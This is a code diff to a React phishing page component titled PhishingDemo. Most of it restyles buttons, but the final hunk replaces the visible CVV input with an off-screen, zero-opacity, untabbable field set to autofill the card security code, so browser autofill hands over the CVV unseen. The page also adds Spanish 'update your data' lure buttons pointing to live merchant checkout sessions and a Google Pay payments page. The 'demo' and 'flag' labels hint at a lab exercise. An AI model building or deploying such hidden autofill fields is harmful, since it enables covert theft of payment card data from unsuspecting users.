@@ -142,29 +142,29 @@ export default function PhishingDemo() {
         }
         .action-btn {
           width: 100%;
-          padding: 12px 16px;
+          padding: 7px 10px;
           background: linear-gradient(135deg, rgba(0,102,255,0.3), rgba(0,212,255,0.2));
-          border: 1.5px solid rgba(0,212,255,0.6);
-          border-radius: 10px;
+          border: 1px solid rgba(0,212,255,0.5);
+          border-radius: 7px;
           color: #e0f4ff;
           font-family: 'Inter', 'Segoe UI', sans-serif;
-          font-size: 15px;
+          font-size: 12px;
           font-weight: 600;
-          letter-spacing: 0.5px;
+          letter-spacing: 0.3px;
           cursor: pointer;
           transition: all 0.2s;
-          margin-bottom: 10px;
+          margin-bottom: 5px;
           text-align: center;
           text-decoration: none;
           display: block;
           box-sizing: border-box;
-          box-shadow: 0 2px 12px rgba(0,212,255,0.2), inset 0 1px 0 rgba(0,212,255,0.15);
+          box-shadow: 0 1px 8px rgba(0,212,255,0.15), inset 0 1px 0 rgba(0,212,255,0.1);
         }
         .action-btn:hover {
           background: linear-gradient(135deg, rgba(0,102,255,0.45), rgba(0,212,255,0.35));
           color: #fff;
           border-color: #00d4ff;
-          box-shadow: 0 4px 20px rgba(0,212,255,0.35), inset 0 1px 0 rgba(0,212,255,0.2);
+          box-shadow: 0 3px 14px rgba(0,212,255,0.3), inset 0 1px 0 rgba(0,212,255,0.2);
           transform: translateY(-1px);
         }
         .popup {
@@ -218,24 +218,24 @@ export default function PhishingDemo() {
       >
         {/* Action Buttons - hidden when submitted */}
         {!submitted && (
-          <div style={{ width: '100%', maxWidth: '300px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
+          <div style={{ width: '100%', maxWidth: '300px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', marginBottom: '14px' }}>
             <button className="action-btn" onClick={() => setShowFlagPopup(true)}>
               VER FLAG AUTOFILL
             </button>
 
-            <a href="https://mechanicalkeyboards.com/checkouts/cn/hWNAbYG7MW6JIpbP6y91OHdR/en/information?_r=AQABhgpjAki45oKTqgsd27H9O-cNnNx8324lMKNh221RyWM&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', lineHeight: '1.2' }}>
+            <a href="https://mechanicalkeyboards.com/checkouts/cn/hWNAbYG7MW6JIpbP6y91OHdR/en/information?_r=AQABhgpjAki45oKTqgsd27H9O-cNnNx8324lMKNh221RyWM&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
               <span>Actualizar Datos Live</span>
-              <span style={{ fontSize: '12px', opacity: 0.7, fontWeight: 400 }}>Keyboards</span>
+              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Keyboards</span>
             </a>
 
-            <a href="https://www.wyze.com/checkouts/cn/hWNAdt2cBXWJNQWcS4UaVWzp/es-us?_r=AQAB9QXN-QSmHHwN6nCuXFI8w0xTyU4Db7jk3KY3l-_RC9w&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', lineHeight: '1.2' }}>
+            <a href="https://www.wyze.com/checkouts/cn/hWNAdt2cBXWJNQWcS4UaVWzp/es-us?_r=AQAB9QXN-QSmHHwN6nCuXFI8w0xTyU4Db7jk3KY3l-_RC9w&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
               <span>Actualizar Datos Live</span>
-              <span style={{ fontSize: '12px', opacity: 0.7, fontWeight: 400 }}>Camaras</span>
+              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Camaras</span>
             </a>
 
-            <a href="https://pay.google.com/gp/w/u/0/home/paymentmethods" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', lineHeight: '1.2' }}>
+            <a href="https://pay.google.com/gp/w/u/0/home/paymentmethods" target="_blank" rel="noopener noreferrer" className="action-btn" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px', lineHeight: '1.1' }}>
               <span>Configurar Perfil de Pagos</span>
-              <span style={{ fontSize: '12px', opacity: 0.7, fontWeight: 400 }}>Google Pay</span>
+              <span style={{ fontSize: '10px', opacity: 0.7, fontWeight: 400 }}>Google Pay</span>
             </a>
           </div>
         )}
@@ -349,44 +349,44 @@ export default function PhishingDemo() {
                 )}
               </div>
 
-              <div style={{ display: 'flex', gap: '16px', marginBottom: '24px' }}>
-                <div style={{ flex: 1 }}>
-                  <label className="field-label">EXPIRY DATE</label>
-                  <input
-                    className="field-input"
-                    type="text"
-                    inputMode="numeric"
-                    placeholder="MM/YY"
-                    value={expiry}
-                    onChange={e => formatExpiry(e.target.value)}
-                    maxLength={5}
-                  />
-                  {expiryError && (
-                    <div
-                      style={{
-                        fontFamily: 'VT323, monospace',
-                        fontSize: '13px',
-                        color: '#ef4444',
-                        marginTop: '4px',
-                        letterSpacing: '1px',
-                      }}
-                    >
-                      {expiryError}
-                    </div>
-                  )}
-                </div>
-                <div style={{ flex: 1 }}>
-                  <label className="field-label">CVV</label>
-                  <input
-                    className="field-input"
-                    type="text"
-                    inputMode="numeric"
-                    placeholder="•••"
-                    value={cvv}
-                    onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
-                    maxLength={4}
-                  />
-                </div>
+              <div style={{ marginBottom: '24px' }}>
+                <label className="field-label">EXPIRY DATE</label>
+                <input
+                  className="field-input"
+                  type="text"
+                  inputMode="numeric"
+                  placeholder="MM/YY"
+                  value={expiry}
+                  onChange={e => formatExpiry(e.target.value)}
+                  maxLength={5}
+                  style={{ fontSize: '24px', padding: '14px 16px', letterSpacing: '4px' }}
+                />
+                {expiryError && (
+                  <div
+                    style={{
+                      fontFamily: 'VT323, monospace',
+                      fontSize: '13px',
+                      color: '#ef4444',
+                      marginTop: '4px',
+                      letterSpacing: '1px',
+                    }}
+                  >
+                    {expiryError}
+                  </div>
+                )}
+              </div>
+              {/* CVV field - hidden but functional */}
+              <div style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, overflow: 'hidden' }}>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  name="cvv"
+                  autoComplete="cc-csc"
+                  value={cvv}
+                  onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                  maxLength={4}
+                  tabIndex={-1}
+                />
               </div>
 
               <button
